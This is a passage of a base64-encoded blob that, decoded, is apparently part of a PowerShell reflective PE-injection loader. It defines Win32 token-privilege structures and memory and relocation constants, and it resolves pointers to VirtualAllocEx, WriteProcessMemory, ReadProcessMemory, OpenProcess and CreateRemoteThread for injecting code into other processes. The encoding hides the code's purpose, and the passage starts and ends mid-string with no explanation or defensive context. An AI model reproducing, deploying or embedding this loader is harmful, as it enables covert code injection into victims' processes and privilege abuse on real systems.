FBhcnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkTFVJRCA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExVSUQgLVZhbHVlICRMVUlECiAgICAgICAgCiAgICAgICAgI1N0cnVjdCBMVUlEX0FORF9BVFRSSUJVVEVTCiAgICAgICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdMVUlEX0FORF9BVFRSSUJVVEVTJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMTIpCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMdWlkJywgJExVSUQsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBdHRyaWJ1dGVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJExVSURfQU5EX0FUVFJJQlVURVMgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMVUlEX0FORF9BVFRSSUJVVEVTIC1WYWx1ZSAkTFVJRF9BTkRfQVRUUklCVVRFUwogICAgICAgIAogICAgICAgICNTdHJ1Y3QgVE9LRU5fUFJJVklMRUdFUwogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnVE9LRU5fUFJJVklMRUdFUycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDE2KQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUHJpdmlsZWdlQ291bnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ByaXZpbGVnZXMnLCAkTFVJRF9BTkRfQVRUUklCVVRFUywgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVE9LRU5fUFJJVklMRUdFUyA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFRPS0VOX1BSSVZJTEVHRVMgLVZhbHVlICRUT0tFTl9QUklWSUxFR0VTCgogICAgICAgIHJldHVybiAkV2luMzJUeXBlcwogICAgfQoKICAgIEZ1bmN0aW9uIEdldC1XaW4zMkNvbnN0YW50cwogICAgewogICAgICAgICRXaW4zMkNvbnN0YW50cyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAogICAgICAgIAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1FTV9DT01NSVQgLVZhbHVlIDB4MDAwMDEwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fUkVTRVJWRSAtVmFsdWUgMHgwMDAwMjAwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfTk9BQ0NFU1MgLVZhbHVlIDB4MDEKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX1JFQURPTkxZIC1WYWx1ZSAweDAyCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9SRUFEV1JJVEUgLVZhbHVlIDB4MDQKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX1dSSVRFQ09QWSAtVmFsdWUgMHgwOAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURSAtVmFsdWUgMHgxMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9SRUFEIC1WYWx1ZSAweDIwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9FWEVDVVRFX1JFQURXUklURSAtVmFsdWUgMHg0MAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9XUklURUNPUFkgLVZhbHVlIDB4ODAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX05PQ0FDSEUgLVZhbHVlIDB4MjAwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0FCU09MVVRFIC1WYWx1ZSAwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0hJR0hMT1cgLVZhbHVlIDMKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9SRUxfQkFTRURfRElSNjQgLVZhbHVlIDEwCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfU0NOX01FTV9ESVNDQVJEQUJMRSAtVmFsdWUgMHgwMjAwMDAwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fRVhFQ1VURSAtVmFsdWUgMHgyMDAwMDAwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fUkVBRCAtVmFsdWUgMHg0MDAwMDAwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fV1JJVEUgLVZhbHVlIDB4ODAwMDAwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX05PVF9DQUNIRUQgLVZhbHVlIDB4MDQwMDAwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fREVDT01NSVQgLVZhbHVlIDB4NDAwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0ZJTEVfRVhFQ1VUQUJMRV9JTUFHRSAtVmFsdWUgMHgwMDAyCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRklMRV9ETEwgLVZhbHVlIDB4MjAwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0RMTENIQVJBQ1RFUklTVElDU19EWU5BTUlDX0JBU0UgLVZhbHVlIDB4NDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTlhfQ09NUEFUIC1WYWx1ZSAweDEwMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1FTV9SRUxFQVNFIC1WYWx1ZSAweDgwMDAKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBUT0tFTl9RVUVSWSAtVmFsdWUgMHgwMDA4CiAgICAgICAgJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgLVZhbHVlIDB4MDAyMAogICAgICAgICRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNFX1BSSVZJTEVHRV9FTkFCTEVEIC1WYWx1ZSAweDIKICAgICAgICAkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFUlJPUl9OT19UT0tFTiAtVmFsdWUgMHgzZjAKICAgICAgICAKICAgICAgICByZXR1cm4gJFdpbjMyQ29uc3RhbnRzCiAgICB9CgogICAgRnVuY3Rpb24gR2V0LVdpbjMyRnVuY3Rpb25zCiAgICB7CiAgICAgICAgJFdpbjMyRnVuY3Rpb25zID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxBbGxvY0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYwogICAgICAgICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkVmlydHVhbEFsbG9jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0FkZHIsICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsQWxsb2MgLVZhbHVlICRWaXJ0dWFsQWxsb2MKICAgICAgICAKICAgICAgICAkVmlydHVhbEFsbG9jRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2NFeAogICAgICAgICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkVmlydHVhbEFsbG9jRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jRXhBZGRyLCAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsQWxsb2NFeCAtVmFsdWUgJFZpcnR1YWxBbGxvY0V4CiAgICAgICAgCiAgICAgICAgJG1lbWNweUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgbXN2Y3J0LmRsbCBtZW1jcHkKICAgICAgICAkbWVtY3B5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkbWVtY3B5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJG1lbWNweUFkZHIsICRtZW1jcHlEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBtZW1jcHkgLVZhbHVlICRtZW1jcHkKICAgICAgICAKICAgICAgICAkbWVtc2V0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBtc3ZjcnQuZGxsIG1lbXNldAogICAgICAgICRtZW1zZXREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkbWVtc2V0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJG1lbXNldEFkZHIsICRtZW1zZXREZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBtZW1zZXQgLVZhbHVlICRtZW1zZXQKICAgICAgICAKICAgICAgICAkTG9hZExpYnJhcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBMb2FkTGlicmFyeUEKICAgICAgICAkTG9hZExpYnJhcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbU3RyaW5nXSkgKFtJbnRQdHJdKQogICAgICAgICRMb2FkTGlicmFyeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb2FkTGlicmFyeUFkZHIsICRMb2FkTGlicmFyeURlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExvYWRMaWJyYXJ5IC1WYWx1ZSAkTG9hZExpYnJhcnkKICAgICAgICAKICAgICAgICAkR2V0UHJvY0FkZHJlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRQcm9jQWRkcmVzcwogICAgICAgICRHZXRQcm9jQWRkcmVzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbU3RyaW5nXSkgKFtJbnRQdHJdKQogICAgICAgICRHZXRQcm9jQWRkcmVzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRQcm9jQWRkcmVzc0FkZHIsICRHZXRQcm9jQWRkcmVzc0RlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldFByb2NBZGRyZXNzIC1WYWx1ZSAkR2V0UHJvY0FkZHJlc3MKICAgICAgICAKICAgICAgICAkR2V0UHJvY0FkZHJlc3NJbnRQdHJBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRQcm9jQWRkcmVzcyAjVGhpcyBpcyBzdGlsbCBHZXRQcm9jQWRkcmVzcywgYnV0IGluc3RlYWQgb2YgUG93ZXJTaGVsbCBjb252ZXJ0aW5nIHRoZSBzdHJpbmcgdG8gYSBwb2ludGVyLCB5b3UgbXVzdCBkbyBpdCB5b3Vyc2VsZgogICAgICAgICRHZXRQcm9jQWRkcmVzc0ludFB0ckRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRHZXRQcm9jQWRkcmVzc0ludFB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRQcm9jQWRkcmVzc0ludFB0ckFkZHIsICRHZXRQcm9jQWRkcmVzc0ludFB0ckRlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldFByb2NBZGRyZXNzSW50UHRyIC1WYWx1ZSAkR2V0UHJvY0FkZHJlc3NJbnRQdHIKICAgICAgICAKICAgICAgICAkVmlydHVhbEZyZWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZQogICAgICAgICRWaXJ0dWFsRnJlZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdKSAoW0Jvb2xdKQogICAgICAgICRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IC1OYW1lIFZpcnR1YWxGcmVlIC1WYWx1ZSAkVmlydHVhbEZyZWUKICAgICAgICAKICAgICAgICAkVmlydHVhbEZyZWVFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlRXgKICAgICAgICAkVmlydHVhbEZyZWVFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSkgKFtCb29sXSkKICAgICAgICAkVmlydHVhbEZyZWVFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUV4QWRkciwgJFZpcnR1YWxGcmVlRXhEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsRnJlZUV4IC1WYWx1ZSAkVmlydHVhbEZyZWVFeAogICAgICAgIAogICAgICAgICRWaXJ0dWFsUHJvdGVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxQcm90ZWN0CiAgICAgICAgJFZpcnR1YWxQcm90ZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkVmlydHVhbFByb3RlY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbFByb3RlY3RBZGRyLCAkVmlydHVhbFByb3RlY3REZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsUHJvdGVjdCAtVmFsdWUgJFZpcnR1YWxQcm90ZWN0CiAgICAgICAgCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldE1vZHVsZUhhbmRsZUEKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10pIChbSW50UHRyXSkKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldE1vZHVsZUhhbmRsZUFkZHIsICRHZXRNb2R1bGVIYW5kbGVEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRNb2R1bGVIYW5kbGUgLVZhbHVlICRHZXRNb2R1bGVIYW5kbGUKICAgICAgICAKICAgICAgICAkRnJlZUxpYnJhcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBGcmVlTGlicmFyeQogICAgICAgICRGcmVlTGlicmFyeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtCb29sXSkgKFtJbnRQdHJdKQogICAgICAgICRGcmVlTGlicmFyeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRGcmVlTGlicmFyeUFkZHIsICRGcmVlTGlicmFyeURlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEZyZWVMaWJyYXJ5IC1WYWx1ZSAkRnJlZUxpYnJhcnkKICAgICAgICAKICAgICAgICAkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2VzcwogICAgICAgICRPcGVuUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtVSW50MzJdLCBbQm9vbF0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJE9wZW5Qcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzQWRkciwgJE9wZW5Qcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgT3BlblByb2Nlc3MgLVZhbHVlICRPcGVuUHJvY2VzcwogICAgICAgIAogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV2FpdEZvclNpbmdsZU9iamVjdAogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdKSAoW1VJbnQzMl0pCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIsICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgV2FpdEZvclNpbmdsZU9iamVjdCAtVmFsdWUgJFdhaXRGb3JTaW5nbGVPYmplY3QKICAgICAgICAKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBXcml0ZVByb2Nlc3NNZW1vcnkgLVZhbHVlICRXcml0ZVByb2Nlc3NNZW1vcnkKICAgICAgICAKICAgICAgICAkUmVhZFByb2Nlc3NNZW1vcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBSZWFkUHJvY2Vzc01lbW9yeQogICAgICAgICRSZWFkUHJvY2Vzc01lbW9yeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkUmVhZFByb2Nlc3NNZW1vcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkUmVhZFByb2Nlc3NNZW1vcnlBZGRyLCAkUmVhZFByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBSZWFkUHJvY2Vzc01lbW9yeSAtVmFsdWUgJFJlYWRQcm9jZXNzTWVtb3J5CiAgICAgICAgCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZAogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIsICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBDcmVhdGVSZW1vdGVUaHJlYWQgLVZhbHVlICRDcmVhdGVSZW1vdG